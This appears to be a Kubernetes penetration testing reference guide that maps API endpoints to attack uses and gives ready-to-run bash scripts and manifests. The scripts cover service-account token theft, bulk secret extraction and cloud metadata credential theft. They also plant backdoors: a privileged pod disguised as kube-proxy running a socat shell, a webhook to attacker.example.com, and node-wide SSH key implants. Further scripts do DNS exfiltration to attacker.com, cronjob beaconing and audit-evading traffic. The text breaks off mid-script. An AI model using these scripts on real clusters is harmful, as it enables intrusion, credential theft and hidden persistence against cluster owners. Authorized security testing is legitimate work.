# Kubernetes API Penetration Testing Reference Guide v2.0 .. beta ..

## Complete API Resource Mapping & Attack Surface

### Core API Group (/api/v1) - Initial Access & Reconnaissance

```text
/api/v1/
├── namespaces/                          # Isolation bypass, tenant enumeration
├── pods/                                # Container access, exec, logs
│   ├── /log                            # Log analysis for credentials
│   ├── /exec                           # Command execution
│   ├── /attach                         # Console attachment
│   ├── /portforward                    # Network pivoting
│   └── /eviction                       # DoS vector
├── services/                            # Service discovery, load balancer config
│   └── /proxy                          # Service proxying for lateral movement
├── endpoints/                           # Backend IP enumeration
├── configmaps/                          # Configuration & credentials
├── secrets/                             # HIGH VALUE - credentials, certs, tokens
├── persistentvolumes/                   # Storage backend enumeration
├── persistentvolumeclaims/             # Data access paths
├── serviceaccounts/                     # Identity sources, token generation
│   └── /token                          # Token request API (1.22+)
├── nodes/                               # Infrastructure mapping
│   ├── /proxy                          # Node access
│   └── /status                         # Resource availability
├── events/                              # Audit trail, activity monitoring
├── limitranges/                         # Resource constraints
├── resourcequotas/                      # Capacity planning intel
├── replicationcontrollers/             # Legacy workload control
└── componentstatuses/                   # Control plane health
```

### Apps API Group (/apis/apps/v1) - Workload Control

```text
/apis/apps/v1/
├── deployments/                         # Application architecture
│   ├── /scale                          # Scaling manipulation
│   └── /rollback                       # Version control
├── replicasets/                         # Replica enumeration
├── daemonsets/                          # Privileged node-level services
├── statefulsets/                        # Stateful workloads (databases)
└── controllerrevisions/                 # Deployment history
```

### Batch API Group (/apis/batch/v1) - Job Exploitation

```text
/apis/batch/v1/
├── jobs/                                # One-time task execution
│   └── /status                         # Job completion tracking
└── cronjobs/                            # Scheduled task hijacking

/apis/batch/v1beta1/
└── cronjobs/                            # Legacy cronjob API
```

### RBAC API - Privilege Mapping & Escalation

```text
/apis/rbac.authorization.k8s.io/v1/
├── roles/                               # Namespace-scoped permissions
├── rolebindings/                        # Permission-to-principal mapping
├── clusterroles/                        # Cluster-wide permissions
│   └── aggregationrules/               # Role composition logic
└── clusterrolebindings/                 # Global privilege assignments
```

### Security & Policy APIs - Defense Analysis

```text
/apis/policy/v1/
├── poddisruptionbudgets/               # Availability constraints
└── podsecuritypolicies/                # Deprecated security policies

/apis/policy/v1beta1/
└── podsecuritypolicies/                # Still found in older clusters

/apis/admissionregistration.k8s.io/v1/
├── validatingwebhookconfigurations/    # Admission control hooks
├── mutatingwebhookconfigurations/      # Pod mutation rules
└── validatingadmissionpolicies/        # Policy enforcement (1.26+)
```

### Networking APIs - Network Segmentation & Access

```text
/apis/networking.k8s.io/v1/
├── networkpolicies/                     # Microsegmentation rules
├── ingresses/                           # External access points
│   └── /status                         # Load balancer exposure
└── ingressclasses/                      # Ingress controller types

/apis/discovery.k8s.io/v1/
└── endpointslices/                      # Modern endpoint discovery
```

### Storage APIs - Data Access Vectors

```text
/apis/storage.k8s.io/v1/
├── storageclasses/                      # Storage backend configuration
├── volumeattachments/                   # Volume-to-node mapping
├── csinodes/                            # CSI driver enumeration
└── csidrivers/                          # Storage driver capabilities

/apis/snapshot.storage.k8s.io/v1/
├── volumesnapshots/                     # Backup access
└── volumesnapshotcontents/              # Snapshot data location
```

### Authentication & Authorization APIs

```text
/apis/authentication.k8s.io/v1/
├── tokenreviews/                        # Token validation
└── tokenrequests/                       # Token generation

/apis/authorization.k8s.io/v1/
├── selfsubjectaccessreviews/           # Permission checking
├── subjectaccessreviews/               # Third-party permission checks
├── selfsubjectrulesreviews/            # Rule enumeration
└── localsubjectaccessreviews/          # Namespace-scoped checks
```

### Certificate Management APIs

```text
/apis/certificates.k8s.io/v1/
└── certificatesigningrequests/         # CSR lifecycle, cert theft

/apis/cert-manager.io/v1/               # cert-manager (if deployed)
├── certificates/                        # Certificate resources
├── certificaterequests/                # CSR tracking
├── issuers/                            # CA configuration
├── clusterissuers/                     # Global CA config
└── challenges/                          # ACME challenge state
```

### Metrics & Monitoring APIs - OPSEC Intelligence

```text
/apis/metrics.k8s.io/v1beta1/
├── nodes/                               # Node resource usage
└── pods/                                # Pod resource consumption

/apis/monitoring.coreos.com/v1/         # Prometheus Operator
├── prometheuses/                        # Prometheus instances
├── alertmanagers/                       # Alert configuration
├── servicemonitors/                     # Monitoring targets
└── prometheusrules/                     # Alert rules (detection logic)
```

### Cloud Provider APIs - Cloud Credential Access

```text
/apis/storage.gke.io/v1beta1/           # GKE-specific
└── gcsfusecsidriver/

/apis/eks.amazonaws.com/v1/             # EKS-specific
└── nodegroup/

/apis/aks.azure.com/v1/                 # AKS-specific
└── managedcluster/
```

---

## Advanced Penetration Testing Methodology

### Phase 1: Initial Access & Token Acquisition

#### Multiple Token Sources

```bash
# 1. From compromised pod (standard)
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 2. From environment variables
env | grep -i kube
echo $KUBERNETES_SERVICE_HOST
echo $KUBERNETES_SERVICE_PORT

# 3. From kubectl config (if available)
cat ~/.kube/config | grep token

# 4. From projected volumes (newer clusters)
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# 5. From legacy locations
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

#### API Server Discovery

```bash
# Method 1: DNS-based (most reliable)
APISERVER="https://kubernetes.default.svc.cluster.local"

# Method 2: Environment variables
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"

# Method 3: Common service IPs
# - 10.43.0.1 (K3s default)
# - 10.96.0.1 (kubeadm default)
# - 10.0.0.1 (some cloud providers)

# Method 4: Gateway discovery
ip route | grep default
nslookup kubernetes.default

# Test connectivity
curl -k $APISERVER/version
```

### Phase 2: Advanced Reconnaissance

#### Comprehensive Version Enumeration

```bash
# Kubernetes version (CVE research)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/version | jq

# API groups discovery
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis | jq '.groups[].name'

# OpenAPI schema (API surface mapping)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/openapi/v2 | jq '.definitions | keys'

# Feature gates (enabled features)
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/nodes | \
  jq '.items[0].status.nodeInfo'
```

#### Permission Enumeration Matrix

```bash
# Self-assessment - comprehensive check
cat > check-permissions.sh << 'EOF'
#!/bin/bash
TOKEN=$1
APISERVER=$2

resources=("pods" "secrets" "configmaps" "services" "deployments" \
           "daemonsets" "statefulsets" "nodes" "namespaces" \
           "serviceaccounts" "roles" "rolebindings" "clusterroles" \
           "clusterrolebindings" "persistentvolumes" "persistentvolumeclaims")

verbs=("get" "list" "create" "update" "patch" "delete" "watch")

for resource in "${resources[@]}"; do
  echo "=== Checking $resource ==="
  for verb in "${verbs[@]}"; do
    result=$(curl -sk -H "Authorization: Bearer $TOKEN" \
      -H "Content-Type: application/json" \
      -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
      -d "{
        \"apiVersion\": \"authorization.k8s.io/v1\",
        \"kind\": \"SelfSubjectAccessReview\",
        \"spec\": {
          \"resourceAttributes\": {
            \"verb\": \"$verb\",
            \"resource\": \"$resource\"
          }
        }
      }" | jq -r '.status.allowed')
    
    if [ "$result" == "true" ]; then
      echo "  ✓ $verb $resource"
    fi
  done
done
EOF

chmod +x check-permissions.sh
./check-permissions.sh "$TOKEN" "$APISERVER"
```

#### Namespace Reconnaissance

```bash
# All namespaces with metadata
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | \
  jq -r '.items[] | "\(.metadata.name) - Created: \(.metadata.creationTimestamp) - Labels: \(.metadata.labels)"'

# High-value namespace targeting
HIGH_VALUE_NS=(
  "kube-system"        # Core components
  "kube-public"        # Public data
  "kube-node-lease"    # Node heartbeats
  "default"            # User workloads
  "monitoring"         # Prometheus, Grafana
  "logging"            # EFK/ELK stack
  "ingress-nginx"      # Ingress controllers
  "cert-manager"       # Certificate management
  "vault"              # HashiCorp Vault
  "istio-system"       # Service mesh
  "argocd"             # GitOps
  "gitlab"             # CI/CD
  "jenkins"            # CI/CD
  "prod"               # Production workloads
  "production"
  "staging"
  "development"
)

for ns in "${HIGH_VALUE_NS[@]}"; do
  echo "=== Scanning $ns ==="
  curl -k -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/$ns 2>/dev/null | \
    jq -r 'select(.metadata != null) | "Found: \(.metadata.name)"'
done
```

### Phase 3: Credential Harvesting (Extended)

#### Secret Extraction Automation

```bash
# Comprehensive secret scanner
cat > extract-secrets.sh << 'EOF'
#!/bin/bash
TOKEN=$1
APISERVER=$2
OUTPUT_DIR="./k8s-secrets-$(date +%s)"
mkdir -p "$OUTPUT_DIR"

# Get all namespaces
namespaces=$(curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | jq -r '.items[].metadata.name')

for ns in $namespaces; do
  echo "[*] Scanning namespace: $ns"
  secrets=$(curl -sk -H "Authorization: Bearer $TOKEN" \
    $APISERVER/api/v1/namespaces/$ns/secrets | \
    jq -r '.items[]? | @base64')
  
  for secret in $secrets; do
    _jq() {
      echo "$secret" | base64 --decode | jq -r "$1"
    }
    
    name=$(_jq '.metadata.name')
    type=$(_jq '.type')
    
    echo "  [+] Found: $name (Type: $type)"
    
    # Extract and decode
    echo "$secret" | base64 --decode | \
      jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d)"' \
      > "$OUTPUT_DIR/${ns}_${name}.txt"
    
    # Check for specific patterns
    if grep -qi "password\|token\|key\|secret\|private" "$OUTPUT_DIR/${ns}_${name}.txt" 2>/dev/null; then
      echo "    [!] HIGH VALUE DETECTED"
    fi
  done
done

echo "[*] Extraction complete. Results in $OUTPUT_DIR"
EOF

chmod +x extract-secrets.sh
./extract-secrets.sh "$TOKEN" "$APISERVER"
```

#### ConfigMap Credential Mining

```bash
# Pattern-based configmap analysis
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/configmaps | \
  jq -r '.items[] | 
    select(.data | to_entries[] | 
    .value | test("password=|token=|apikey=|secret=|key=|bearer|basic|jdbc:|mongodb:|mysql:|postgres:|redis:|AKIA|-----BEGIN"; "i")) | 
    {
      namespace: .metadata.namespace,
      name: .metadata.name,
      matches: [.data | to_entries[] | select(.value | test("password=|token=|apikey=|secret=|key=|bearer|basic|jdbc:|mongodb:|mysql:|postgres:|redis:|AKIA|-----BEGIN"; "i")) | .key]
    }'

# Extract specific configmap with analysis
extract_configmap() {
  local ns=$1
  local name=$2
  
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$ns/configmaps/$name" | \
    jq -r '.data | to_entries[] | "\n=== \(.key) ===\n\(.value)"' | \
    grep -E -A5 -B5 "password|token|key|secret|credential|apikey|bearer|basic" -i
}
```

#### ServiceAccount Token Harvesting

```bash
# Enumerate all ServiceAccounts
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/serviceaccounts | \
  jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name)"'

# Request token for ServiceAccount (1.22+)
create_sa_token() {
  local ns=$1
  local sa=$2
  
  curl -k -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -X POST "$APISERVER/api/v1/namespaces/$ns/serviceaccounts/$sa/token" \
    -d '{
      "apiVersion": "authentication.k8s.io/v1",
      "kind": "TokenRequest",
      "spec": {
        "expirationSeconds": 3600
      }
    }' | jq -r '.status.token'
}

# Find ServiceAccounts with ClusterRoleBindings
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  jq -r '.items[] | select(.subjects[]?.kind == "ServiceAccount") | 
    {
      binding: .metadata.name,
      role: .roleRef.name,
      subjects: [.subjects[] | select(.kind == "ServiceAccount") | "\(.namespace)/\(.name)"]
    }'
```

### Phase 4: Lateral Movement & Privilege Escalation

#### Pod Enumeration (Extended)

```bash
# Find interesting pods with security context analysis
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/pods | \
  jq -r '.items[] | 
    select(
      .spec.securityContext.privileged == true or
      .spec.hostNetwork == true or
      .spec.hostPID == true or
      .spec.hostIPC == true or
      .spec.volumes[]?.hostPath != null or
      (.spec.containers[]?.securityContext.capabilities.add[]? | 
       test("SYS_ADMIN|SYS_PTRACE|SYS_MODULE|DAC_READ_SEARCH|DAC_OVERRIDE"))
    ) |
    {
      namespace: .metadata.namespace,
      name: .metadata.name,
      privileged: .spec.securityContext.privileged,
      hostNetwork: .spec.hostNetwork,
      hostPID: .spec.hostPID,
      hostIPC: .spec.hostIPC,
      hostPaths: [.spec.volumes[]? | select(.hostPath != null) | .hostPath.path],
      capabilities: [.spec.containers[]?.securityContext.capabilities.add[]? // empty]
    }'
```

#### Pod Execution & Exploitation

```bash
# Execute command in pod (kubectl alternative)
exec_in_pod() {
  local ns=$1
  local pod=$2
  local cmd=$3
  
  # Using websocket/SPDY (complex, better use kubectl)
  # For demo purposes:
  kubectl exec -n "$ns" "$pod" -- sh -c "$cmd"
}

# Port forward for lateral movement
# kubectl port-forward -n <namespace> <pod> <local>:<remote>

# Log extraction for reconnaissance
curl -k -H "Authorization: Bearer $TOKEN" \
  "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/$POD_NAME/log?tailLines=100" | \
  grep -E "password|token|key|secret|error|exception" -i
```

#### Container Escape Enumeration

```bash
# Check from inside compromised pod
cat > check-escape-vectors.sh << 'EOF'
#!/bin/bash

echo "=== Container Escape Vector Analysis ==="

# 1. Check for Docker socket
echo "[*] Checking for Docker socket..."
if [ -S /var/run/docker.sock ]; then
  echo "  [!] CRITICAL: Docker socket mounted!"
  ls -la /var/run/docker.sock
fi

# 2. Check for host filesystem mounts
echo "[*] Checking for host mounts..."
mount | grep -E "^/dev/|hostPath" | grep -v "tmpfs\|proc\|sysfs"

# 3. Check capabilities
echo "[*] Checking capabilities..."
if command -v capsh &> /dev/null; then
  capsh --print
elif command -v getpcaps &> /dev/null; then
  getpcaps $$
fi

# 4. Check for privileged mode
echo "[*] Checking privilege status..."
if [ -f /proc/1/status ]; then
  grep -E "CapEff|CapPrm" /proc/1/status
fi

# 5. Check for host PID namespace
echo "[*] Checking PID namespace..."
if [ -d /proc/1 ]; then
  if [ "$(cat /proc/1/cmdline | tr '\0' ' ')" != "$(cat /proc/self/cmdline | tr '\0' ' ')" ]; then
    echo "  [!] Host PID namespace detected!"
    ps aux | head
  fi
fi

# 6. Check for writeable host paths
echo "[*] Checking writeable host paths..."
for path in /host /hostroot /rootfs /host_root /node_root; do
  if [ -d "$path" ] && [ -w "$path" ]; then
    echo "  [!] Writeable host path: $path"
    ls -la "$path" 2>/dev/null | head
  fi
done

# 7. Check for Kubernetes API access
echo "[*] Checking Kubernetes API access..."
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
  echo "  [+] ServiceAccount token available"
fi

# 8. Check cgroup configuration
echo "[*] Checking cgroup configuration..."
if [ -d /sys/fs/cgroup ]; then
  ls -la /sys/fs/cgroup/
  if [ -w /sys/fs/cgroup/cgroup.procs ]; then
    echo "  [!] CRITICAL: Writeable cgroup.procs!"
  fi
fi

# 9. Check for kernel exploits
echo "[*] Kernel version..."
uname -a

# 10. Check for cloud metadata access
echo "[*] Checking cloud metadata..."
if curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ &>/dev/null; then
  echo "  [!] AWS metadata accessible!"
fi
if curl -s --max-time 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ &>/dev/null; then
  echo "  [!] GCP metadata accessible!"
fi

EOF

chmod +x check-escape-vectors.sh
./check-escape-vectors.sh
```

### Phase 5: Persistence & Backdoors

#### Create Privileged ServiceAccount

```bash
# Create admin ServiceAccount
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: ServiceAccount
metadata:
  name: cluster-admin-sa
  namespace: kube-system
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: cluster-admin-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: cluster-admin
subjects:
- kind: ServiceAccount
  name: cluster-admin-sa
  namespace: kube-system
EOF

# Extract token
TOKEN=$(kubectl create token cluster-admin-sa -n kube-system --duration=87600h)
echo $TOKEN > ~/.k8s-backdoor-token
```

#### Deploy Backdoor Pod

```bash
# Privileged backdoor with persistence
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: backdoor
  namespace: kube-system
  labels:
    component: kube-proxy  # Disguise as legit component
spec:
  serviceAccountName: cluster-admin-sa
  hostNetwork: true
  hostPID: true
  hostIPC: true
  containers:
  - name: backdoor
    image: alpine:latest
    command: ["/bin/sh"]
    args:
      - -c
      - |
        apk add --no-cache curl bash socat
        # Reverse shell
        while true; do
          socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
          sleep 3600
        done
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
      type: Directory
  restartPolicy: Always
EOF
```

#### Webhook Backdoor

```bash
# Mutating webhook for persistence
cat <<EOF | kubectl apply -f -
apiVersion: admissionregistration.k8s.io/v1
kind: MutatingWebhookConfiguration
metadata:
  name: backdoor-webhook
webhooks:
- name: backdoor.pentest.local
  clientConfig:
    url: "https://attacker.example.com/mutate"
    caBundle: $(cat ca.crt | base64 -w0)
  rules:
  - operations: ["CREATE"]
    apiGroups: [""]
    apiVersions: ["v1"]
    resources: ["pods"]
  admissionReviewVersions: ["v1"]
  sideEffects: None
  timeoutSeconds: 5
EOF
```

### Phase 6: Data Exfiltration

#### PersistentVolume Data Access

```bash
# Enumerate PVs
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/persistentvolumes | \
  jq -r '.items[] | {
    name: .metadata.name,
    capacity: .spec.capacity.storage,
    storageClass: .spec.storageClassName,
    accessModes: .spec.accessModes,
    path: .spec.hostPath.path,
    nfs: .spec.nfs,
    claim: .spec.claimRef
  }'

# Create pod to access PV
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: pv-exfil
  namespace: default
spec:
  containers:
  - name: exfil
    image: busybox
    command: ["sleep", "3600"]
    volumeMounts:
    - name: data
      mountPath: /data
  volumes:
  - name: data
    persistentVolumeClaim:
      claimName: target-pvc
EOF

# Exfiltrate data
kubectl exec -it pv-exfil -- tar czf - /data | base64 > exfil-data.tar.gz.b64
```

#### Secret Exfiltration via DNS

```bash
# DNS-based exfiltration (evade egress filtering)
cat > dns-exfil.sh << 'EOF'
#!/bin/bash
SECRET_DATA=$(kubectl get secret -n kube-system admin-token -o jsonpath='{.data.token}')
CHUNKS=$(echo "$SECRET_DATA" | fold -w 63)

i=0
for chunk in $CHUNKS; do
  nslookup "$chunk.$i.exfil.attacker.com" >/dev/null 2>&1
  ((i++))
  sleep 1
done
EOF
```

---

## Advanced Attack Techniques

### 1. Token Impersonation & Privilege Escalation

```bash
# Impersonate user/group
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Impersonate-User: admin" \
  -H "Impersonate-Group: system:masters" \
  $APISERVER/api/v1/namespaces

# Check if impersonation is allowed
curl -k -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -X POST $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "verb": "impersonate",
        "resource": "users"
      }
    }
  }'
```

### 2. Admission Controller Bypass

```bash
# Check for admission controllers
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/pods | \
  jq -r '.items[] | select(.metadata.name | startswith("kube-apiserver")) | 
    .spec.containers[].command[] | select(contains("enable-admission-plugins"))'

# Deploy pod with annotation bypass
kubectl run bypass-pod --image=nginx \
  --overrides='{"metadata":{"annotations":{"admission.policy.k8s.io/exempt":"true"}}}'
```

### 3. Node Compromise via DaemonSet

```bash
# Deploy node compromise DaemonSet
cat <<EOF | kubectl apply -f -
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: node-pwn
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: node-pwn
  template:
    metadata:
      labels:
        name: node-pwn
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: pwn
        image: alpine
        command: ["/bin/sh"]
        args:
          - -c
          - |
            # Install SSH key on host
            mkdir -p /host/root/.ssh
            echo "ssh-rsa AAAA... attacker@pentest" >> /host/root/.ssh/authorized_keys
            chmod 700 /host/root/.ssh
            chmod 600 /host/root/.ssh/authorized_keys
            # Keep running
            while true; do sleep 3600; done
        securityContext:
          privileged: true
        volumeMounts:
        - name: host
          mountPath: /host
      volumes:
      - name: host
        hostPath:
          path: /
EOF
```

### 4. etcd Direct Access (if exposed)

```bash
# Check for etcd exposure
curl -k https://etcd-server:2379/version

# Extract secrets directly from etcd (requires client cert)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://etcd-server:2379 \
  --cert=/path/to/client.crt \
  --key=/path/to/client.key \
  --cacert=/path/to/ca.crt \
  get /registry/secrets --prefix --keys-only

# Dump all secrets
ETCDCTL_API=3 etcdctl \
  --endpoints=https://etcd-server:2379 \
  --cert=/path/to/client.crt \
  --key=/path/to/client.key \
  --cacert=/path/to/ca.crt \
  get /registry/secrets --prefix
```

### 5. Cloud Provider Metadata Exploitation

```bash
# AWS IMDS v1 (if accessible from pod)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS IMDS v2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP metadata
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure metadata
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### 6. Container Registry Credential Theft

```bash
# Find image pull secrets
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets | \
  jq -r '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | 
    {
      namespace: .metadata.namespace,
      name: .metadata.name,
      data: .data[".dockerconfigjson"] | @base64d
    }'

# Decode and use
kubectl get secret registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | \
  base64 -d | jq -r '.auths | to_entries[] | "\(.key)\n  Username: \(.value.username)\n  Password: \(.value.password)"'
```

---

## Detection Evasion Techniques

### 1. Low-and-Slow Reconnaissance

```bash
# Throttled scanning to avoid rate limiting
scan_api_slow() {
  for endpoint in $(cat api-endpoints.txt); do
    curl -sk -H "Authorization: Bearer $TOKEN" \
      "$APISERVER$endpoint" -o "/dev/null" -w "%{http_code} $endpoint\n"
    sleep $(shuf -i 5-15 -n 1)  # Random delay 5-15 seconds
  done
}
```

### 2. User-Agent Rotation

```bash
# Legitimate-looking user agents
USER_AGENTS=(
  "kubectl/v1.28.0 (linux/amd64) kubernetes/abc1234"
  "kube-proxy/v1.28.0 (linux/amd64) kubernetes/def5678"
  "kubelet/v1.28.0 (linux/amd64) kubernetes/ghi9012"
  "helm/v3.12.0 (linux/amd64)"
  "kustomize/v5.0.0 (linux/amd64)"
)

random_ua() {
  echo "${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}"
}

curl -k -H "Authorization: Bearer $TOKEN" \
  -H "User-Agent: $(random_ua)" \
  $APISERVER/api/v1/secrets
```

### 3. Request Timing Obfuscation

```bash
# Blend with normal traffic patterns
# Mimic typical kubectl usage patterns
typical_queries=(
  "/api/v1/namespaces/default/pods"
  "/apis/apps/v1/namespaces/default/deployments"
  "/api/v1/namespaces/default/services"
  "/api/v1/namespaces/default/configmaps"
)

for i in {1..50}; do
  # Random legitimate query
  legit_query=${typical_queries[$RANDOM % ${#typical_queries[@]}]}
  curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER$legit_query" >/dev/null
  
  # Occasionally inject recon query
  if [ $((RANDOM % 10)) -eq 0 ]; then
    curl -sk -H "Authorization: Bearer $TOKEN" \
      "$APISERVER/api/v1/secrets" >/dev/null
  fi
  
  sleep $(shuf -i 30-90 -n 1)
done
```

### 4. Annotation-Based Steganography

```bash
# Hide data in annotations (less monitored than labels)
kubectl annotate secret target-secret \
  "monitoring.prometheus.io/config"="$(echo 'exfiltrated-data' | base64)"

kubectl annotate deployment nginx \
  "kubectl.kubernetes.io/last-applied-configuration"="$(cat backdoor-config.json | base64)"
```

### 5. Living-off-the-Land (LoL)

```bash
# Use legitimate tools/containers already in cluster
# Find debug/utility pods
kubectl get pods --all-namespaces | grep -E "debug|curl|busybox|alpine|ubuntu"

# Use existing cronjobs for persistence
kubectl patch cronjob existing-job -n default --type='json' \
  -p='[{"op": "add", "path": "/spec/jobTemplate/spec/template/spec/containers/0/command/-", "value": "curl attacker.com/beacon"}]'
```

---

## Common Misconfigurations & Exploitation

### 1. Default ServiceAccount with Excessive Permissions

```bash
# Check default ServiceAccount permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default

# Exploit if overprivileged
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/kube-system/secrets
```

### 2. Wildcard RBAC Rules

```bash
# Find dangerous wildcards
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles | \
  jq -r '.items[] | select(.rules[]? | 
    (.verbs[]? == "*" or .resources[]? == "*" or .apiGroups[]? == "*")) | 
    .metadata.name'

# Check bindings
curl -k -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings | \
  jq -r '.items[] | select(.roleRef.name == "cluster-admin" or .roleRef.name == "admin")'
```

### 3. Privileged Pod Configurations

```bash
# Scan for privilege escalation vectors
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(
    .spec.securityContext.privileged == true or
    .spec.hostNetwork == true or
    .spec.hostPID == true or
    (.spec.containers[]?.securityContext.capabilities.add[]? | 
     IN("SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE"))
  ) | "\(.metadata.namespace)/\(.metadata.name)"'
```

### 4. Exposed Dashboard without Auth

```bash
# Check for Kubernetes Dashboard
curl -k https://dashboard.cluster.local/
nmap -p 8443 dashboard.cluster.local

# If accessible, exploit token-based auth bypass
# Or use default ServiceAccount token
```

### 5. Insecure API Server Flags

```bash
# Check for insecure flags
kubectl get pod -n kube-system kube-apiserver-* -o yaml | \
  grep -E "anonymous-auth|insecure-port|insecure-bind-address"

# Exploit if --anonymous-auth=true
curl -k $APISERVER/api/v1/namespaces  # No auth needed
```

### 6. Network Policy Absence

```bash
# Check for network policies
kubectl get networkpolicies --all-namespaces

# If none exist, all pods can communicate freely
# Exploit: lateral movement without restriction
```

---

## Automated Scanning Tools & Scripts

### Complete Cluster Audit Script

```bash
#!/bin/bash
# k8s-pentest-audit.sh

TOKEN=${1:-$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)}
APISERVER=${2:-https://kubernetes.default.svc.cluster.local}
OUTPUT_DIR="k8s-audit-$(date +%F-%H%M%S)"

mkdir -p "$OUTPUT_DIR"/{secrets,configmaps,rbac,pods,nodes,misc}

echo "[*] Starting Kubernetes Penetration Test Audit"
echo "[*] Output directory: $OUTPUT_DIR"

# 1. Basic cluster info
echo "[*] Gathering cluster information..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/version > "$OUTPUT_DIR/misc/version.json"

curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis > "$OUTPUT_DIR/misc/api-groups.json"

# 2. Namespace enumeration
echo "[*] Enumerating namespaces..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces | \
  jq -r '.items[].metadata.name' > "$OUTPUT_DIR/misc/namespaces.txt"

# 3. Secret extraction
echo "[*] Extracting secrets..."
while IFS= read -r ns; do
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$ns/secrets" | \
    jq -r ".items[] | {namespace: \"$ns\", name: .metadata.name, type: .type, data: .data}" \
    > "$OUTPUT_DIR/secrets/$ns-secrets.json" 2>/dev/null
done < "$OUTPUT_DIR/misc/namespaces.txt"

# 4. ConfigMap extraction
echo "[*] Extracting configmaps..."
while IFS= read -r ns; do
  curl -sk -H "Authorization: Bearer $TOKEN" \
    "$APISERVER/api/v1/namespaces/$ns/configmaps" \
    > "$OUTPUT_DIR/configmaps/$ns-configmaps.json" 2>/dev/null
done < "$OUTPUT_DIR/misc/namespaces.txt"

# 5. RBAC analysis
echo "[*] Analyzing RBAC..."
curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles \
  > "$OUTPUT_DIR/rbac/clusterroles.json"

curl -sk -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings \
  > "$OUTPUT_DIR/rbac/clusterrolebindings.json"

# Find dangerous permissions
jq -r '.items[] | select(.rules[]? | 
  (.verbs[]? == "*" or .resources[]? == "*")) | 
